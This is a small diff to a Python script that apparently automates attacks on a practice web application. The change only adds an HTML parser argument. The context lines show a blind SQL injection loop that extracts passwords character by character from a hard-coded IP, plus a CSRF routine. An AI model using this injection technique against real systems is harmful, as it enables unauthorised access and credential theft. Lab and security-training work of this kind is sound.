@@ -83,7 +83,7 @@ def sql():
                 url = 'http://35.225.46.109/sql_injection/low/id/{}%27%20and%20password%20like%20%27{}%25%27%3B--' \
                     .format(i, pwd_n)
                 driver.get(url)
-                soup = BeautifulSoup(driver.page_source)
+                soup = BeautifulSoup(driver.page_source, features='html.parser')
                 tr_elements = soup.find_all('tr')
                 if len(tr_elements) == 2:
                     pwd = pwd_n
@@ -139,7 +139,7 @@ def csrf(level):
     # get comments
     url = TARGET_SERVER_ENDPOINT + '/' + 'csrf_target'
     driver.get(url)
-    soup = BeautifulSoup(driver.page_source)
+    soup = BeautifulSoup(driver.page_source, features='html.parser')
     tr_elements = soup.find_all('tr')
     tr_elements.pop(0)
     comments = []
